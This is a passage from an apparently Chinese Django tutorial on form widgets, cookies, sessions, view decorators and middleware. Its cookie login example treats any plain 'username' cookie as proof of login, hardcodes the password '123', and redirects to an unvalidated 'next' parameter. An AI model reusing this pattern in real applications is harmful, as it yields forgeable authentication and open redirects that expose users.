            RegexValidator(<span class="hljs-string">r&apos;^[0-9]+$&apos;</span>, <span class="hljs-string">&apos;&#x8BF7;&#x8F93;&#x5165;&#x6570;&#x5B57;&apos;</span>),
            RegexValidator(<span class="hljs-string">r&apos;^159[0-9]+$&apos;</span>, <span class="hljs-string">&apos;&#x6570;&#x5B57;&#x5FC5;&#x987B;&#x4EE5;159&#x5F00;&#x5934;&apos;</span>)
        ]
</code></pre>
<p>&#x5176;&#x4ED6;&#x7C7B;&#x578B;&#x6E32;&#x67D3;</p>
<pre><code class="lang-python"><span class="hljs-comment"># radio</span>
    gender = forms.ChoiceField(
        choices=((<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&#x7537;&quot;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;&#x5973;&quot;</span>), (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;&#x4FDD;&#x5BC6;&quot;</span>)),
        label=<span class="hljs-string">&quot;&#x6027;&#x522B;&quot;</span>,
        initial=<span class="hljs-number">3</span>,
        widget=forms.widgets.RadioSelect()
    )
    <span class="hljs-comment"># select</span>
    hobby = forms.ChoiceField(
        choices=((<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&#x7BEE;&#x7403;&quot;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;&#x8DB3;&#x7403;&quot;</span>), (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;&#x53CC;&#x8272;&#x7403;&quot;</span>),),
        label=<span class="hljs-string">&quot;&#x7231;&#x597D;&quot;</span>,
        initial=<span class="hljs-number">3</span>,
        widget=forms.widgets.Select()
    )
    <span class="hljs-comment"># &#x591A;&#x9009;</span>
    hobby1 = forms.MultipleChoiceField(
        choices=((<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&#x7BEE;&#x7403;&quot;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;&#x8DB3;&#x7403;&quot;</span>), (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;&#x53CC;&#x8272;&#x7403;&quot;</span>),),
        label=<span class="hljs-string">&quot;&#x7231;&#x597D;&quot;</span>,
        initial=[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>],
        widget=forms.widgets.SelectMultiple()
    )
    <span class="hljs-comment"># &#x5355;&#x9009;checkbox</span>
    keep = forms.ChoiceField(
        label=<span class="hljs-string">&quot;&#x662F;&#x5426;&#x8BB0;&#x4F4F;&#x5BC6;&#x7801;&quot;</span>,
        initial=<span class="hljs-string">&quot;checked&quot;</span>,
        widget=forms.widgets.CheckboxInput()
    )
    <span class="hljs-comment"># &#x591A;&#x9009;checkbox</span>
    hobby2 = forms.MultipleChoiceField(
        choices=((<span class="hljs-number">1</span>, <span class="hljs-string">&quot;&#x7BEE;&#x7403;&quot;</span>), (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;&#x8DB3;&#x7403;&quot;</span>), (<span class="hljs-number">3</span>, <span class="hljs-string">&quot;&#x53CC;&#x8272;&#x7403;&quot;</span>),),
        label=<span class="hljs-string">&quot;&#x7231;&#x597D;&quot;</span>,
        initial=[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>],
        widget=forms.widgets.CheckboxSelectMultiple()
    )
</code></pre>
<h4 id="django&#x64CD;&#x4F5C;cookie">django&#x64CD;&#x4F5C;Cookie</h4>
<p>urls.py</p>
<pre><code class="lang-python">    re_path(<span class="hljs-string">r&apos;^home/&apos;</span>, views.home),
    re_path(<span class="hljs-string">r&apos;^login/&apos;</span>,views.login),
</code></pre>
<p>views.py</p>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x8BBE;&#x7F6E;cookie
    obj.set_cookie(key,value)
&#x83B7;&#x53D6;cookie
    request.COOKIES.get(key)
&#x5728;&#x8BBE;&#x7F6E;cookie&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x8D85;&#x65F6;&#x65F6;&#x95F4;
    obj.set_cookie(&apos;username&apos;, &apos;jason666&apos;,max_age=3,expires=3)

    max_age
    expires
        &#x4E24;&#x8005;&#x90FD;&#x662F;&#x8BBE;&#x7F6E;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#x7684; &#x5E76;&#x4E14;&#x90FD;&#x662F;&#x4EE5;&#x79D2;&#x4E3A;&#x5355;&#x4F4D;
        &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F; &#x9488;&#x5BF9;IE&#x6D4F;&#x89C8;&#x5668;&#x9700;&#x8981;&#x4F7F;&#x7528;expires
&#x4E3B;&#x52A8;&#x5220;&#x9664;cookie(&#x6CE8;&#x9500;&#x529F;&#x80FD;)


&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x6211;&#x4EEC;&#x5B8C;&#x6210;&#x4E00;&#x4E2A;&#x771F;&#x6B63;&#x7684;&#x767B;&#x9646;&#x529F;&#x80FD;</span>
<span class="hljs-comment"># &#x6821;&#x9A8C;&#x7528;&#x6237;&#x662F;&#x5426;&#x767B;&#x9646;&#x7684;&#x88C5;&#x9970;&#x5668;</span>
<span class="hljs-string">&quot;&quot;&quot;
&#x7528;&#x6237;&#x5982;&#x679C;&#x5728;&#x6CA1;&#x6709;&#x767B;&#x9646;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x60F3;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x9700;&#x8981;&#x767B;&#x9646;&#x7684;&#x9875;&#x9762;
&#x90A3;&#x4E48;&#x5148;&#x8DF3;&#x8F6C;&#x5230;&#x767B;&#x9646;&#x9875;&#x9762; &#x5F53;&#x7528;&#x6237;&#x8F93;&#x5165;&#x6B63;&#x786E;&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x4E4B;&#x540E;
&#x5E94;&#x8BE5;&#x8DF3;&#x8F6C;&#x5230;&#x7528;&#x6237;&#x4E4B;&#x524D;&#x60F3;&#x8981;&#x8BBF;&#x95EE;&#x7684;&#x9875;&#x9762;&#x53BB; &#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x6B7B;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login_auth</span><span class="hljs-params">(func)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inner</span><span class="hljs-params">(request,*args,**kwargs)</span>:</span>
        <span class="hljs-comment"># print(request.path_info)</span>
        <span class="hljs-comment"># print(request.get_full_path())  # &#x80FD;&#x591F;&#x83B7;&#x53D6;&#x5230;&#x7528;&#x6237;&#x4E0A;&#x4E00;&#x6B21;&#x60F3;&#x8981;&#x8BBF;&#x95EE;&#x7684;url</span>
        target_url = request.get_full_path()
        <span class="hljs-keyword">if</span> request.COOKIES.get(<span class="hljs-string">&apos;username&apos;</span>):
            <span class="hljs-keyword">return</span> func(request,*args,**kwargs)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&apos;/login/?next=%s&apos;</span>%target_url)
    <span class="hljs-keyword">return</span> inner

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(request)</span>:</span>
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&apos;POST&apos;</span>:
        username = request.POST.get(<span class="hljs-string">&apos;username&apos;</span>)
        password = request.POST.get(<span class="hljs-string">&apos;password&apos;</span>)
        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&apos;jason&apos;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&apos;123&apos;</span>:

            <span class="hljs-comment"># &#x83B7;&#x53D6;&#x7528;&#x6237;&#x4E0A;&#x4E00;&#x6B21;&#x60F3;&#x8981;&#x8BBF;&#x95EE;&#x7684;url</span>
            target_url = request.GET.get(<span class="hljs-string">&apos;next&apos;</span>)  <span class="hljs-comment"># &#x8FD9;&#x4E2A;&#x7ED3;&#x679C;&#x53EF;&#x80FD;&#x662F;None</span>
            <span class="hljs-keyword">if</span> target_url:
                obj = redirect(target_url)
            <span class="hljs-keyword">else</span>:
                <span class="hljs-comment"># &#x4FDD;&#x5B58;&#x7528;&#x6237;&#x767B;&#x9646;&#x72B6;&#x6001;</span>
                obj = redirect(<span class="hljs-string">&apos;/home/&apos;</span>)
            <span class="hljs-comment"># &#x8BA9;&#x6D4F;&#x89C8;&#x5668;&#x8BB0;&#x5F55;cookie&#x6570;&#x636E;</span>
            obj.set_cookie(<span class="hljs-string">&apos;username&apos;</span>, <span class="hljs-string">&apos;jason666&apos;</span>)
            <span class="hljs-string">&quot;&quot;&quot;
            &#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x5355;&#x5355;&#x4F1A;&#x5E2E;&#x4F60;&#x5B58;
            &#x800C;&#x4E14;&#x540E;&#x9762;&#x6BCF;&#x6B21;&#x8BBF;&#x95EE;&#x4F60;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x4F1A;&#x5E26;&#x7740;&#x5B83;&#x8FC7;&#x6765;
            &quot;&quot;&quot;</span>
            <span class="hljs-comment"># &#x8DF3;&#x8F6C;&#x5230;&#x4E00;&#x4E2A;&#x9700;&#x8981;&#x7528;&#x6237;&#x767B;&#x9646;&#x4E4B;&#x540E;&#x624D;&#x80FD;&#x770B;&#x7684;&#x9875;&#x9762;</span>
            <span class="hljs-keyword">return</span> obj
    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;login.html&apos;</span>)


<span class="hljs-meta">@login_auth</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home</span><span class="hljs-params">(request)</span>:</span>
    <span class="hljs-comment"># &#x83B7;&#x53D6;cookie&#x4FE1;&#x606F; &#x5224;&#x65AD;&#x4F60;&#x6709;&#x6CA1;&#x6709;</span>
    <span class="hljs-comment"># if request.COOKIES.get(&apos;username&apos;) == &apos;jason666&apos;:</span>
    <span class="hljs-comment">#     return HttpResponse(&quot;&#x6211;&#x662F;home&#x9875;&#x9762;&#xFF0C;&#x53EA;&#x6709;&#x767B;&#x9646;&#x7684;&#x7528;&#x6237;&#x624D;&#x80FD;&#x8FDB;&#x6765;&#x54DF;~&quot;)</span>
    <span class="hljs-comment"># # &#x6CA1;&#x6709;&#x767B;&#x9646;&#x5E94;&#x8BE5;&#x8DF3;&#x8F6C;&#x5230;&#x767B;&#x9646;&#x9875;&#x9762;</span>
    <span class="hljs-comment"># return redirect(&apos;/login/&apos;)</span>
    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;&#x6211;&#x662F;home&#x9875;&#x9762;&#xFF0C;&#x53EA;&#x6709;&#x767B;&#x9646;&#x7684;&#x7528;&#x6237;&#x624D;&#x80FD;&#x8FDB;&#x6765;&#x54DF;~&quot;</span>)
</code></pre>
<p><a href="https://imgse.com/i/p9ry0mR" target="_blank"><img src="https://s1.ax1x.com/2023/05/11/p9ry0mR.png" alt="p9ry0mR.png"></a></p>
<h4 id="session&#x64CD;&#x4F5C;">session&#x64CD;&#x4F5C;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
session&#x6570;&#x636E;&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x7684;(&#x5B58;&#xFF1F;)&#xFF0C;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;
    sessionid:&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;

1.&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x64CD;&#x4F5C;session&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;django&#x9ED8;&#x8BA4;&#x7684;&#x4E00;&#x5F20;django_session&#x8868;
    &#x6570;&#x636E;&#x5E93;&#x8FC1;&#x79FB;&#x547D;&#x4EE4;
        django&#x4F1A;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x5F88;&#x591A;&#x8868;    django_session&#x5C31;&#x662F;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x5F20;


django&#x9ED8;&#x8BA4;session&#x7684;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x662F;14&#x5929;
    &#x4F46;&#x662F;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x4EBA;&#x4E3A;&#x7684;&#x4FEE;&#x6539;&#x5B83;


&#x8BBE;&#x7F6E;session    
request.session[&apos;key&apos;] = value

&#x83B7;&#x53D6;session
request.session.get(&apos;key&apos;)

&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;
request.session.set_expiry()
    &#x62EC;&#x53F7;&#x5185;&#x53EF;&#x4EE5;&#x653E;&#x56DB;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x53C2;&#x6570;
        1.&#x6574;&#x6570;                        &#x591A;&#x5C11;&#x79D2;
        2.&#x65E5;&#x671F;&#x5BF9;&#x8C61;               &#x5230;&#x6307;&#x5B9A;&#x65E5;&#x671F;&#x5C31;&#x5931;&#x6548;
        3.0                                &#x4E00;&#x65E6;&#x5F53;&#x524D;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x5173;&#x95ED;&#x7ACB;&#x523B;&#x5931;&#x6548;
        4.&#x4E0D;&#x5199;                        &#x5931;&#x6548;&#x65F6;&#x95F4;&#x5C31;&#x53D6;&#x51B3;&#x4E8E;django&#x5185;&#x90E8;&#x5168;&#x5C40;session&#x9ED8;&#x8BA4;&#x7684;&#x5931;&#x6548;&#x65F6;&#x95F4;

&#x6E05;&#x9664;session    
    request.session.delete()  # &#x53EA;&#x5220;&#x670D;&#x52A1;&#x7AEF;&#x7684; &#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E0D;&#x5220;
    request.session.flush()  # &#x6D4F;&#x89C8;&#x5668;&#x548C;&#x670D;&#x52A1;&#x7AEF;&#x90FD;&#x6E05;&#x7A7A;(&#x63A8;&#x8350;&#x4F7F;&#x7528;)


session&#x662F;&#x4FDD;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x7AEF;&#x7684; &#x4F46;&#x662F;session&#x7684;&#x4FDD;&#x5B58;&#x4F4D;&#x7F6E;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x79CD;&#x9009;&#x62E9;
    1.MySQL
    2.&#x6587;&#x4EF6;
    3.redis
    4.memcache
    ...


django_session&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6761;&#x6570;&#x662F;&#x53D6;&#x51B3;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;&#x7684;
    &#x540C;&#x4E00;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x4E0A;(IP&#x5730;&#x5740;)&#x540C;&#x4E00;&#x4E2A;&#x6D4F;&#x89C8;&#x5668;&#x53EA;&#x4F1A;&#x6709;&#x4E00;&#x6761;&#x6570;&#x636E;&#x751F;&#x6548;
    (&#x5F53;session&#x8FC7;&#x671F;&#x7684;&#x65F6;&#x5019;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;&#x591A;&#x6761;&#x6570;&#x636E;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x4F46;&#x662F;&#x8BE5;&#x73B0;&#x8C61;&#x4E0D;&#x4F1A;&#x6301;&#x7EED;&#x5F88;&#x4E45;&#xFF0C;&#x5185;&#x90E8;&#x4F1A;&#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x8FC7;&#x671F;&#x7684;&#x6570;&#x636E;&#x6E05;&#x9664; &#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EE3;&#x7801;&#x6E05;&#x9664;)

    &#x4E3B;&#x8981;&#x662F;&#x4E3A;&#x4E86;&#x8282;&#x7701;&#x670D;&#x52A1;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x8D44;&#x6E90;
&quot;&quot;&quot;</span>

request.session[<span class="hljs-string">&apos;hobby&apos;</span>] = <span class="hljs-string">&apos;girl&apos;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5185;&#x90E8;&#x53D1;&#x9001;&#x4E86;&#x90A3;&#x4E9B;&#x4E8B;
        1.django&#x5185;&#x90E8;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;
        2.django&#x5185;&#x90E8;&#x81EA;&#x52A8;&#x5C06;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#x548C;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5230;django_session&#x8868;&#x4E2D;
            2.1&#x5148;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x4EA7;&#x751F;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x7684;&#x7F13;&#x5B58;
            2.2&#x5728;&#x54CD;&#x5E94;&#x7ED3;&#x679C;django&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x65F6;&#x5019;&#x624D;&#x771F;&#x6B63;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;
        3.&#x5C06;&#x4EA7;&#x751F;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x6D4F;&#x89C8;&#x5668;&#x4FDD;&#x5B58;
    &quot;&quot;&quot;</span>
request.session.get(<span class="hljs-string">&apos;hobby&apos;</span>)
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5185;&#x90E8;&#x53D1;&#x9001;&#x4E86;&#x90A3;&#x4E9B;&#x4E8B;
        1.&#x81EA;&#x52A8;&#x4ECE;&#x6D4F;&#x89C8;&#x5668;&#x8BF7;&#x6C42;&#x4E2D;&#x83B7;&#x53D6;sessionid&#x5BF9;&#x5E94;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;
        2.&#x62FF;&#x7740;&#x8BE5;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;&#x53BB;django_session&#x8868;&#x4E2D;&#x67E5;&#x627E;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;
        3.
            &#x5982;&#x679C;&#x6BD4;&#x5BF9;&#x4E0A;&#x4E86; &#x5219;&#x5C06;&#x5BF9;&#x5E94;&#x7684;&#x6570;&#x636E;&#x53D6;&#x51FA;&#x5E76;&#x4EE5;&#x5B57;&#x5178;&#x7684;&#x5F62;&#x5F0F;&#x5C01;&#x88C5;&#x5230;request.session&#x4E2D;
            &#x5982;&#x679C;&#x6BD4;&#x5BF9;&#x4E0D;&#x4E0A; &#x5219;request.session.get()&#x8FD4;&#x56DE;&#x7684;&#x662F;None
    &quot;&quot;&quot;</span>


<span class="hljs-comment"># &#x5229;&#x7528;session&#x5B9E;&#x73B0;&#x767B;&#x9646;&#x9A8C;&#x8BC1;</span>
</code></pre>
<h4 id="cbv&#x5982;&#x4F55;&#x6DFB;&#x52A0;&#x88C5;&#x9970;&#x5668;">CBV&#x5982;&#x4F55;&#x6DFB;&#x52A0;&#x88C5;&#x9970;&#x5668;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> django.views <span class="hljs-keyword">import</span> View
<span class="hljs-keyword">from</span> django.utils.decorators <span class="hljs-keyword">import</span> method_decorator
<span class="hljs-string">&quot;&quot;&quot;
CBV&#x4E2D;django&#x4E0D;&#x5EFA;&#x8BAE;&#x4F60;&#x76F4;&#x63A5;&#x7ED9;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#x52A0;&#x88C5;&#x9970;&#x5668;
&#x65E0;&#x8BBA;&#x8BE5;&#x88C5;&#x9970;&#x5668;&#x80FD;&#x90FD;&#x6B63;&#x5E38;&#x7ED9;&#x4F60; &#x90FD;&#x4E0D;&#x5EFA;&#x8BAE;&#x76F4;&#x63A5;&#x52A0;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># @method_decorator(login_auth,name=&apos;get&apos;)  # &#x65B9;&#x5F0F;2(&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x591A;&#x4E2A;&#x9488;&#x5BF9;&#x4E0D;&#x540C;&#x7684;&#x65B9;&#x6CD5;&#x52A0;&#x4E0D;&#x540C;&#x7684;&#x88C5;&#x9970;&#x5668;)</span>
<span class="hljs-comment"># @method_decorator(login_auth,name=&apos;post&apos;)</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyLogin</span><span class="hljs-params">(View)</span>:</span>
<span class="hljs-meta">    @method_decorator(login_auth)  # &#x65B9;&#x5F0F;3:&#x5B83;&#x4F1A;&#x76F4;&#x63A5;&#x4F5C;&#x7528;&#x4E8E;&#x5F53;&#x524D;&#x7C7B;&#x91CC;&#x9762;&#x7684;&#x6240;&#x6709;&#x7684;&#x65B9;&#x6CD5;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(self, request, *args, **kwargs)</span>:</span>
        <span class="hljs-keyword">return</span> super().dispatch(request,*args,**kwargs)
    <span class="hljs-comment"># @method_decorator(login_auth)  # &#x65B9;&#x5F0F;1:&#x6307;&#x540D;&#x9053;&#x59D3;</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self,request)</span>:</span>
        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&quot;get&#x8BF7;&#x6C42;&quot;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self,request)</span>:</span>
        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&apos;post&#x8BF7;&#x6C42;&apos;</span>)
</code></pre>
<h4 id="django&#x4E2D;&#x95F4;&#x4EF6;">django&#x4E2D;&#x95F4;&#x4EF6;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
django&#x4E2D;&#x95F4;&#x4EF6;&#x662F;django&#x7684;&#x95E8;&#x6237;
1.&#x8BF7;&#x6C42;&#x6765;&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x5148;&#x7ECF;&#x8FC7;&#x4E2D;&#x95F4;&#x4EF6;&#x624D;&#x80FD;&#x5230;&#x8FBE;&#x771F;&#x6B63;&#x7684;django&#x540E;&#x7AEF;
2.&#x54CD;&#x5E94;&#x8D70;&#x7684;&#x65F6;&#x5019;&#x6700;&#x540E;&#x4E5F;&#x9700;&#x8981;&#x7ECF;&#x8FC7;&#x4E2D;&#x95F4;&#x4EF6;&#x624D;&#x80FD;&#x53D1;&#x9001;&#x51FA;&#x53BB;

django&#x81EA;&#x5E26;&#x4E03;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;
&quot;&quot;&quot;</span>
django&#x8BF7;&#x6C42;&#x751F;&#x547D;&#x5468;&#x671F;&#x6D41;&#x7A0B;&#x56FE;

&#x7814;&#x7A76;django&#x4E2D;&#x95F4;&#x4EF6;&#x4EE3;&#x7801;&#x89C4;&#x5F8B;
MIDDLEWARE = [
    <span class="hljs-string">&apos;django.middleware.security.SecurityMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.contrib.sessions.middleware.SessionMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.middleware.common.CommonMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.middleware.csrf.CsrfViewMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.contrib.messages.middleware.MessageMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.middleware.clickjacking.XFrameOptionsMiddleware&apos;</span>,
]

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SessionMiddleware</span><span class="hljs-params">(MiddlewareMixin)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_request</span><span class="hljs-params">(self, request)</span>:</span>
        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME)
        request.session = self.SessionStore(session_key)
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_response</span><span class="hljs-params">(self, request, response)</span>:</span>
        <span class="hljs-keyword">return</span> response

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CsrfViewMiddleware</span><span class="hljs-params">(MiddlewareMixin)</span>:</span>
      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_request</span><span class="hljs-params">(self, request)</span>:</span>
        csrf_token = self._get_token(request)
        <span class="hljs-keyword">if</span> csrf_token <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
            <span class="hljs-comment"># Use same token next time.</span>
            request.META[<span class="hljs-string">&apos;CSRF_COOKIE&apos;</span>] = csrf_token
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_view</span><span class="hljs-params">(self, request, callback, callback_args, callback_kwargs)</span>:</span>
        <span class="hljs-keyword">return</span> self._accept(request)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_response</span><span class="hljs-params">(self, request, response)</span>:</span>
        <span class="hljs-keyword">return</span> response

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AuthenticationMiddleware</span><span class="hljs-params">(MiddlewareMixin)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_request</span><span class="hljs-params">(self, request)</span>:</span>
        request.user = SimpleLazyObject(<span class="hljs-keyword">lambda</span>: get_user(request))
<span class="hljs-string">&quot;&quot;&quot;
django&#x652F;&#x6301;&#x7A0B;&#x5E8F;&#x5458;&#x81EA;&#x5B9A;&#x4E49;&#x4E2D;&#x95F4;&#x4EF6;&#x5E76;&#x4E14;&#x66B4;&#x9732;&#x7ED9;&#x7A0B;&#x5E8F;&#x5458;&#x4E94;&#x4E2A;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x65B9;&#x6CD5;
    1.&#x5FC5;&#x987B;&#x638C;&#x63E1;
        process_request

        process_response
    2.&#x4E86;&#x89E3;&#x5373;&#x53EF;
        process_view

        process_template_response

        process_exception
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x5B9A;&#x4E49;&#x81EA;&#x5DF1;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;">&#x5B9A;&#x4E49;&#x81EA;&#x5DF1;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
1.&#x5728;&#x9879;&#x76EE;&#x540D;&#x6216;&#x8005;&#x5E94;&#x7528;&#x540D;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;&#x540D;&#x79F0;&#x7684;&#x6587;&#x4EF6;&#x5939;
2.&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x5939;&#x5185;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;&#x540D;&#x79F0;&#x7684;py&#x6587;&#x4EF6;
3.&#x5728;&#x8BE5;py&#x6587;&#x4EF6;&#x5185;&#x9700;&#x8981;&#x4E66;&#x5199;&#x7C7B;(&#x8FD9;&#x4E2A;&#x7C7B;&#x5FC5;&#x987B;&#x7EE7;&#x627F;MiddlewareMixin)
    &#x7136;&#x540E;&#x5728;&#x8FD9;&#x4E2A;&#x7C7B;&#x91CC;&#x9762;&#x5C31;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x4E94;&#x4E2A;&#x65B9;&#x6CD5;&#x4E86;
    (&#x8FD9;&#x4E94;&#x4E2A;&#x65B9;&#x6CD5;&#x5E76;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x90FD;&#x9700;&#x8981;&#x4E66;&#x5199;&#xFF0C;&#x7528;&#x51E0;&#x4E2A;&#x5199;&#x51E0;&#x4E2A;)
4.&#x9700;&#x8981;&#x5C06;&#x7C7B;&#x7684;&#x8DEF;&#x5F84;&#x4EE5;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5F62;&#x5F0F;&#x6CE8;&#x518C;&#x5230;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x624D;&#x80FD;&#x751F;&#x6548;
MIDDLEWARE = [
    &apos;django.middleware.security.SecurityMiddleware&apos;,
    &apos;django.contrib.sessions.middleware.SessionMiddleware&apos;,
    &apos;django.middleware.common.CommonMiddleware&apos;,
    &apos;django.middleware.csrf.CsrfViewMiddleware&apos;,
    &apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;,
    &apos;django.contrib.messages.middleware.MessageMiddleware&apos;,
    &apos;django.middleware.clickjacking.XFrameOptionsMiddleware&apos;,
    &apos;&#x4F60;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x8DEF;&#x5F84;1&apos;,
    &apos;&#x4F60;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x8DEF;&#x5F84;2&apos;,
    &apos;&#x4F60;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x8DEF;&#x5F84;3&apos;,
]

&quot;&quot;&quot;</span>
